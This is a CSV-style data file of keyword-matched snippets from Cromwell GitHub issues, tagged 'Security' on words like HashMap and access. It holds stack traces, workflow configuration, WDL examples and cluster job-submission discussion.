Security,cala:283); 	at akka.dispatch.Mailbox.run(Mailbox.scala:224); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:235); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.RuntimeException: Class cromwell.services.womtool.impl.WomtoolServiceInCromwellActor for service Womtool cannot be found in the class path.; 	at cromwell.services.ServiceRegistryActor$.serviceProps(ServiceRegistryActor.scala:54); 	at cromwell.services.ServiceRegistryActor$.$anonfun$serviceNameToPropsMap$2(ServiceRegistryActor.scala:37); 	at scala.collection.TraversableLike.$anonfun$map$1(TraversableLike.scala:234); 	at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:231); 	at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:462); 	at scala.collection.TraversableLike.map(TraversableLike.scala:234); 	at scala.collection.TraversableLike.map$(TraversableLike.scala:227); 	at scala.collection.AbstractTraversable.map(Traversable.scala:104); 	at cromwell.services.ServiceRegistryActor$.serviceNameToPropsMap(ServiceRegistryActor.scala:36); 	at cromwell.services.ServiceRegistryActor.serviceProps(ServiceRegistryActor.scala:63); 	at cromwell.services.ServiceRegistryActor.<init>(ServiceRegistryActor.scala:65); 	at cromwell.services.ServiceRegistryActor$.$anonfun$props$1(ServiceRegistryActor.scala:25); 	at akka.actor.TypedCreatorFunctionConsumer.produce(IndirectActorProducer.scala:87); 	at akka.actor.Props.newActor(Props.scala:212); 	at akka.actor.ActorCell.newActor(ActorCell.scala:624); 	at akka.actor.ActorCell.create(ActorCell.scala:650); 	... 9 common frames omitted; Caused by: java.lang.ClassNotFoundException: cromwell.services.womtool.impl.WomtoolServiceInCromwellActor; 	at java.net.URLClassLoader.fin,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881:4085,Hash,HashMap,4085,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4676#issuecomment-467132881,1,['Hash'],['HashMap']
Security,ce.sum$(TraversableOnce.scala:216); 	at scala.collection.AbstractIterator.sum(Iterator.scala:1417); 	at better.files.File.size(File.scala:502); 	at cromwell.core.path.BetterFileMethods.size(BetterFileMethods.scala:323); 	at cromwell.core.path.BetterFileMethods.size$(BetterFileMethods.scala:323); 	at cromwell.filesystems.gcs.GcsPath.size(GcsPathBuilder.scala:179); 	at cromwell.backend.wdl.ReadLikeFunctions.$anonfun$fileSize$2(ReadLikeFunctions.scala:18); 	at scala.runtime.java8.JFunction0$mcJ$sp.apply(JFunction0$mcJ$sp.java:12); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.wdl.ReadLikeFunctions.$anonfun$fileSize$1(ReadLikeFunctions.scala:18); 	at cromwell.backend.wdl.ReadLikeFunctions.$anonfun$validateFileSizeIsWithinLimits$1(ReadLikeFunctions.scala:54); 	at scala.util.Success.flatMap(Try.scala:247); 	at cromwell.backend.wdl.ReadLikeFunctions.validateFileSizeIsWithinLimits(ReadLikeFunctions.scala:53); 	at cromwell.backend.wdl.ReadLikeFunctions.validateFileSizeIsWithinLimits$(ReadLikeFunctions.scala:51); 	at cromwell.backend.standard.StandardExpressionFunctions.validateFileSizeIsWithinLimits(StandardExpressionFunctions.scala:22); 	at cromwell.backend.wdl.ReadLikeFunctions.read_string(ReadLikeFunctions.scala:83); 	at cromwell.backend.wdl.ReadLikeFunctions.read_string$(ReadLikeFunctions.scala:81); 	at cromwell.backend.standard.StandardExpressionFunctions.read_string(StandardExpressionFunctions.scala:22); 	at sun.reflect.GeneratedMethodAccessor360.invoke(Unknown Source); 	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43); 	at java.lang.reflect.Method.invoke(Method.java:498); 	at wdl4s.wdl.expression.WdlFunctions.$anonfun$getFunction$1(WdlFunctions.scala:11); 	at wdl4s.wdl.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:190); 	at wdl4s.wdl.expression.ValueEvaluator.evaluate(ValueEvaluator.scala:56); 	at wdl4s.wdl.WdlExpression$.evaluate(WdlExpression.scala:91); 	at wdl4s.wdl.WdlExpression.evaluate(WdlExpress,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2576:6537,validat,validateFileSizeIsWithinLimits,6537,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2576,1,['validat'],['validateFileSizeIsWithinLimits']
Security,"cephfs/punim0751/${docker}; singularity build --sandbox $IMAGE docker://${docker} > /dev/null; sbatch -J ${job_name} -D ${cwd} -o ${cwd}/execution/stdout -e ${cwd}/execution/stderr -t ${runtime_minutes} \; ${""-c "" + cpus} \; --mem-per-cpu=${requested_memory_mb_per_core} \; --wrap ""singularity exec --userns -B ${cwd}:${docker_cwd} $IMAGE ${job_shell} ${script}""; """"""; ```. Just two things I'd like to discuss. Firstly, because you are pulling the docker image inside the sbatch script, this depends on the cluster you're working on allowing network access for the workers. While that is possible on our local cluster, my discussion with some sysadmins made me realise that this wasn't necessarily commonplace, and even on our cluster they strongly discouraged me from relying too heavily on it. This made me look for a solution that was even more generalizable. This is why I `singularity build` the image before I submit it, using the head node. This ensures that all network-requiring work is done on the head node, where network access is guaranteed. I also make sure to set a cache directory, so we don't download the same docker image multiple times in the case of a scatter job etc. Of course, if you do have network access for your workers and the admins have no issue with you using it, pulling the image from the worker is probably a better option to avoid hogging the head node. The second main difference in my config is that the singularity binary I was using did not have `setuid` permissions, meaning that I had to use the sandbox format, and run the image using `--userns`. This is obviously only required if your sysadmins don't trust `singularity`, but I think it's important to demonstrate a way of running containers without *any* privileges at all. @geoffjentry all this discussion is obviously going way beyond this original PR. Once we've settled on our recommendations, how do you think we should share this information with the Cromwell community? Is an example config in the ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475:1311,access,access,1311,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4039#issuecomment-461281475,1,['access'],['access']
Security,ception: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:876) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:847) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecord(SSLSocketImpl.java:717) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.sendChangeCipherSpec(Handshaker.java:1077) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.sendChangeCipherAndFinish(ClientHandshaker.java:1222) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.serverHelloDone(ClientHandshaker.java:1134) ~[na:1.8.0_72]; at sun.security.ssl.ClientHandshaker.processMessage(ClientHandshaker.java:348) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.processLoop(Handshaker.java:979) ~[na:1.8.0_72]; at sun.security.ssl.Handshaker.process_record(Handshaker.java:914) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:1062) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.performInitialHandshake(SSLSocketImpl.java:1375) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1403) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.startHandshake(SSLSocketImpl.java:1387) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsClient.afterConnect(HttpsClient.java:559) ~[na:1.8.0_72]; at sun.net.www.protocol.https.AbstractDelegateHttpsURLConnection.connect(AbstractDelegateHttpsURLConnection.java:185) ~[na:1.8.0_72]; at sun.net.www.protocol.https.HttpsURLConnectionImpl.connect(HttpsURLConnectionImpl.java:153) ~[na:1.8.0_72]; at com.google.api.client.http.javanet.NetHttpRequest,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:8101,secur,security,8101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['secur'],['security']
Security,"cess by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to method java.nio.Bits.unaligned(); WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.selectedKeys; WARNING: Illegal reflective access by org.python.netty.util.internal.ReflectionUtil (file:/home/jeremiah/code/fresh/really/cromwell/server/target/scala-2.12/cromwell-40-aa86539-SNAP.jar) to field sun.nio.ch.SelectorImpl.publicSelectedKeys; [2019-04-18 17:19:50,24] [info] Pre Processing Inputs...; Exception in thread ""MainThread"" cromwell.CromwellEntryPoint$$anon$1: ERROR: Unable to submit workflow to Cromwell::; Cannot find a tool or workflow with ID 'None' in file file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl's set: [file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#main, file:///home/jeremiah/fail_cromwell/test_wf_pack.cwl#touch.cwl]; 	at cromwell.CromwellEntryPoint$.$anonfun$validOrFailSubmission$1(CromwellEntryPoint.scala:255); 	at cats.data.Validated.valueOr(Validated.scala:48); 	at cromwell.CromwellEntryPoint$.validOrFailSubmission(CromwellEntryPoint.scala:255); 	at cromwell.CromwellEntryPoint$.validateRunArguments(CromwellEntryPoint.scala:251); 	at cromwell.CromwellEntryPoint$.runSingle(CromwellEntryPoint.scala:62); 	at cromwell.CromwellApp$.runCromwell(CromwellApp.scala:14); 	at cromwell.CromwellApp$.delayedEndpoint$cromwell$CromwellApp$1(CromwellApp.scala:25); 	at cromwell.CromwellApp$delayedInit$body.apply(CromwellApp.scala:3); 	at scala.Function0.apply$mcV$sp(Function0.scala:34); 	at scala.Function0.apply$mcV$sp$(Function0.scala:34); 	at scala.runtime.AbstractFunction0.apply$mcV$sp(AbstractFunction0.scala:12); 	at scala.App.$anonfun$main$1$adapted(App.scala:76); 	at scala.collection.immutable.List.foreach(List.scala:389); ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416:3592,Validat,Validated,3592,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4103#issuecomment-484714416,3,"['Validat', 'validat']","['Validated', 'validateRunArguments']"
Security,"ch responses from PAPI:; #; # Note: Try raising this value if you see errors in logs like:; # WARN - PAPI request worker PAPIQueryWorker-[...] terminated. 99 run creation requests, 0 status poll requests, and 0 abort requests will be reconsidered. If any of those succeeded in the cloud before the batch request failed, they might be run twice.; # ERROR - Read timed out; # connect = 10 seconds; }; }; filesystems {; gcs {; # A reference to a potentially different auth for manipulating files via engine functions.; auth = ""application-default""; # Google project which will be billed for the requests; project = ""xxxxx-xxxxx-xxxxx"". caching {; # When a cache hit is found, the following duplication strategy will be followed to use the cached outputs; # Possible values: ""copy"", ""reference"". Defaults to ""copy""; # ""copy"": Copy the output files; # ""reference"": DO NOT copy the output files but point to the original output files instead.; # Will still make sure than all the original output files exist and are accessible before; # going forward with the cache hit.; duplication-strategy = ""copy""; }; }; }. default-runtime-attributes {; cpu: 4; failOnStderr: false; continueOnReturnCode: 0; memory: ""2 GB""; bootDiskSizeGb: 10; # Allowed to be a String, or a list of Strings; disks: ""local-disk 10 SSD""; noAddress: false; preemptible: 0; zones: [""us-central1-a"", ""us-central1-b""]; }. include ""papi_v2_reference_image_manifest.conf""; }; }; }; }; ```. WDL:. ```; task hello {; String addressee ; command {; echo ""Hello ${addressee}! Welcome to Cromwell . . . on Google Cloud!"" ; }; output {; String message = read_string(stdout()); }; runtime {; docker: ""ubuntu:latest""; }; }. workflow wf_hello {; call hello. output {; hello.message; }; }; ```. input. ```; {; ""wf_hello.hello.addressee"": ""World""; }; ```. Gcloud log (edited):. ```; done: true; metadata:; '@type': type.googleapis.com/google.cloud.lifesciences.v2beta.Metadata; createTime: '2021-08-03T15:21:55.984657Z'; endTime: '2021-08-03T15:24:03.533",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6462:5650,access,accessible,5650,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6462,1,['access'],['accessible']
Security,chLocallyQualifiedInputs(WorkflowActor.scala:962) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$processRunnableCall(WorkflowActor.scala:1254) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:868) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$33.apply(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$$anonfun$map$1.apply(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:867) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467) ~[cromwell.jar:0.19]; at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36) ~[cromwell.jar:0.19]; at akka.actor.FSM$class.processEvent(FSM.scala:604) ~[cromwell.jar:0.19]; at cromwell.engine.workflow.WorkflowActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowActor.scala:236) ~[cromwell.jar:0.19]; at akka.actor.LoggingFSM$class.processEvent(FSM.scala:734) ~[cromwell.jar:0.19]; at cromwell.en,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:5995,Hash,HashMap,5995,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['Hash'],['HashMap']
Security,che Miss|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:result|Cache Miss|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hit|false|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:failOnStderr|68934A3E9455FA72420237EB05902327|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:docker|4AD3C387725244C1348F252B031B956D|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:runtime attribute:continueOnReturnCode|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output expression:File sorted_bam|816FBD6EEA5D806309AA0664E2F2AB86|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:output count|C4CA4238A0B923820DCC509A6F75849B|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleRunID|A3F4D40B1A8326642B9C761E2FE16F3E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String sampleGenomicID|5844E24465D27D94BD0D311D5D189FC9|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String runtime_attr:queueArn|2382ECF7BF8F09D7CD67C24B,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:2382,hash,hashes,2382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,cher-2676] shutting down JVM since 'akka.jvm-exit-on-fatal-error' is enabled for ActorSystem[cromwell-system]. **java.lang.OutOfMemoryError: Java heap space**; at java.util.Arrays.copyOfRange(Arrays.java:3664); at java.lang.String.<init>(String.java:207); at java.lang.StringBuilder.toString(StringBuilder.java:407); at scala.StringContext.standardInterpolator(StringContext.scala:128); at scala.StringContext.s(StringContext.scala:95); at cromwell.engine.workflow.WorkflowActor$$anonfun$34.apply(WorkflowActor.scala:885); at cromwell.engine.workflow.WorkflowActor$$anonfun$34.apply(WorkflowActor.scala:881); at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:155); at scala.collection.TraversableOnce$$anonfun$foldLeft$1.apply(TraversableOnce.scala:155); at scala.collection.immutable.HashMap$HashMap1.foreach(HashMap.scala:221); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.immutable.HashMap$HashTrieMap.foreach(HashMap.scala:428); at scala.collection.TraversableOnce$class.foldLeft(TraversableOnce.scala:155); at scala.collection.AbstractTraversable.foldLeft(Traversable.scala:104); at cromwell.engine.workflow.WorkflowActor.cromwell$engine$workflow$WorkflowActor$$startRunnableCalls(WorkflowActor.scala:881); at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:532); at cromwell.engine.workflow.WorkflowActor$$anonfun$2.applyOrElse(WorkflowActor.scala:467); at scala.runtime.AbstractPartialFunction.apply(AbstractPartialFunction.scala:36); at akka.actor.FSM$class.processEvent(FSM.scala:604); at cromwell.engine.workflow.WorkflowActor.akka$actor$LoggingFSM$$super$processEvent(WorkflowActor.scala:236); at akka.actor.LoggingFSM$class.processEvent(FSM.scala:734); at cromwell.engine.workflow.WorkflowActor.processEvent(WorkflowActor.scala:236); at akka.actor.FSM$class.akka$actor$FSM$$processMsg(FSM.,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/695:10796,Hash,HashMap,10796,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/695,1,['Hash'],['HashMap']
Security,ching:hashes:input:String default_attr:queueArn|2382ECF7BF8F09D7CD67C24B52AD78BF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:String default_attr:docker|A5281F25296D4311ED0C46422719018E|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int runtime_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int numCPUs|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:max_retries|CFCD208495D565EF66E7DFF9F98764DA|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Int default_attr:cpu_cores|C74D97B01EAE257E44AA9D5BADE97BAF|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float runtime_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |5de042e3-7a03-4c77-8972-f0e4cd010e4b|callCaching:hashes:input:Float default_attr:mem_gb|5BA1DE412E01037F8843D097DCFAF28A|; |29791b64-b47a-44ba-aff0-7ab48bc10677|callCaching:hashes:input:Float,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7248:4942,hash,hashes,4942,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7248,1,['hash'],['hashes']
Security,"cho@broadinstitute.org""; }. }. workflow tool_gsea_mrnaseq_subtypes_workflow {; call tool_gsea_mrnaseq_subtypes; }; ```. Thanks,; Tim. ---. @geoffjentry commented on [Tue Mar 29 2016](https://github.com/broadinstitute/wdltool/issues/8#issuecomment-203042213). When talking to @knoblett she said that this appears to be something which previously was resolved - perhaps there's been a regression, or it's slightly different somehow. ---. @kbergin commented on [Wed Mar 30 2016](https://github.com/broadinstitute/wdltool/issues/8#issuecomment-203469521). I also observed something similar. One of my tasks was failing because I had an input designated as an input in the call, and in the task, but it actually wasn't an input for the workflow nor in the json. I feel like validate or some error handling should have caught that? Instead it just didn't make it through JES and said it 'failed to localize inputs'. But Brad pointed out that I think I used swagger to validate not wdltools, so this could be entirely my fault, as he said those may not be in sync / up to date wise? I wasn't aware. Anyways here was my situation in case it's at all helpful, the missing var is **File gender_mask_bed**:. ```; workflow GenomeStripBamWorkflow {; String sample_name; String bam_name; String analysis_directory; File bam; File ref_fasta; File ref_fasta_index; File ref_dict; File ref_genome_sizes; File ploidy_map; File copy_number_mask; File copy_number_mask_index; File read_depth_mask; File ref_profile; File genome_mask; File genome_mask_index; File configs. ##This is the call that had the issue, there are some before it that it depends on, ; ##but not for the missing input (gender_mask_bed); call CallSampleGender as CallSampleGender {; input:; analysis_directory = analysis_directory,; ref_fasta = ref_fasta,; ref_fasta_index = ref_fasta_index,; ref_dict = ref_dict,; genome_mask = genome_mask,; genome_mask_index = genome_mask_index,; ploidy_map = ploidy_map,; header_bam = ExtractBamSubset.header_bam",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2874:3105,validat,validate,3105,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2874,1,['validat'],['validate']
Security,"cket"": ""gs://broad-dsde-methods/cromwell-execution-30"",; ""zone"": ""us-east1-d"",; ""instanceName"": ""ggp-10276417784841300252""; },; ""outputs"": {; ""outBam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-PreSort/md.sorted.bam""; },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 1 LOCAL"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""us.gcr.io/broad-gatk/gatk:4.0.2.1"",; ""cpu"": ""4"",; ""noAddress"": ""false"",; ""zones"": ""us-central1-a,us-central1-b,us-east1-d,us-central1-c,us-central1-f,us-east1-c"",; ""memory"": ""16 GB""; },; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": false,; ""result"": ""Cache Miss"",; ""hashes"": {; ""output count"": ""C4CA4238A0B923820DCC509A6F75849B"",; ""runtime attribute"": {; ""docker"": ""727DC68A78243A55A510496DBD51C8FD"",; ""continueOnReturnCode"": ""CFCD208495D565EF66E7DFF9F98764DA"",; ""failOnStderr"": ""68934A3E9455FA72420237EB05902327""; },; ""output expression"": {; ""File outBam"": ""51E81723BF4AE3737FA7A05AD3C404E0""; },; ""input count"": ""A87FF679A2F3E71D9181A67B7542122C"",; ""backend name"": ""5BAA79C7C5A573C899A61D342AA00484"",; ""command template"": ""7F303905B5A7C3C5E133EEA5D655F93F"",; ""input"": {; ""String docker"": ""5FFD9AB91DECDD52945847CAED219F0A"",; ""String outputName"": ""A3830295D56B220883B7627EB49D6ECD"",; ""String sortOrder"": ""33D645FB17F6C04818DAB3100252CF39"",; ""File bam"": ""v+At8g==""; }; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache""; },; ""inputs"": {; ""outputName"": ""md.sorted"",; ""bam"": ""gs://broad-public-datasets/NA12878/NA12878.hg38.aligned.unsorted.duplicates_marked.bam"",; ""docker"": ""us.gcr.io/broad-gatk/gatk:4.0.2.1"",; ""sortOrder"": ""queryname""; },; ""backendLabels"": {; ""wdl-task-name"": ""sortsam"",; ""wdl-call-alias"": ""presort"",; ""cromwell-workflow-id"": ""cromwell-01c7d76f-5b2b-48cd-be08-ce75b923666e""; },; ""returnCode"": 0,; ""labels"": {; ""wdl-call-alias"": ""PreSort"",; ""cromwell-workflow-id"": ""cromwell-01c7d76f-5b2b-48cd-be08-ce75b923666e"",; ""wdl-tas",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328:6856,hash,hashes,6856,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328,1,['hash'],['hashes']
Security,"cks from Google.; # 1000 is the default ""Queries per 100 seconds per user"", 50000 is the default ""Queries per 100 seconds""; # See https://cloud.google.com/genomics/quotas for more information; genomics-api-queries-per-100-seconds = 1000. # Polling for completion backs-off gradually for slower-running jobs.; # This is the maximum polling interval (in seconds):; maximum-polling-interval = 600. # Number of workers to assign to PAPI requests; request-workers = 3. genomics {; # A reference to an auth defined in the `google` stanza at the top.; # This auth is used to create pipelines and manipulate auth JSONs.; auth = ""application-default"". # Endpoint for APIs, no reason to change this unless directed by Google.; endpoint-url = ""https://genomics.googleapis.com/"". # Currently Cloud Life Sciences API is available only in `us-central1` and `europe-west2` locations.; location = ""us-west1"". # Restrict access to VM metadata. Useful in cases when untrusted containers are running under a service; # account not owned by the submitting user; restrict-metadata-access = false. # Pipelines v2 only: specify the number of times localization and delocalization operations should be attempted; # There is no logic to determine if the error was transient or not, everything is retried upon failure; # Defaults to 3; localization-attempts = 3. # Specifies the minimum file size for `gsutil cp` to use parallel composite uploads during delocalization.; # Parallel composite uploads can result in a significant improvement in delocalization speed for large files; # but may introduce complexities in downloading such files from GCS, please see; # https://cloud.google.com/storage/docs/gsutil/commands/cp#parallel-composite-uploads for more information.; #; # If set to 0 parallel composite uploads are turned off. The default Cromwell configuration turns off; # parallel composite uploads, this sample configuration turns it on for files of 150M or larger.; parallel-composite-upload-threshold=""150M""; }. files",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:2957,access,access,2957,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['access'],['access']
Security,commit hash has our cromwell was running on - 192ea6025613df967d60e9e975693144035379d7,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1763#issuecomment-266790899:7,hash,hash,7,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1763#issuecomment-266790899,1,['hash'],['hash']
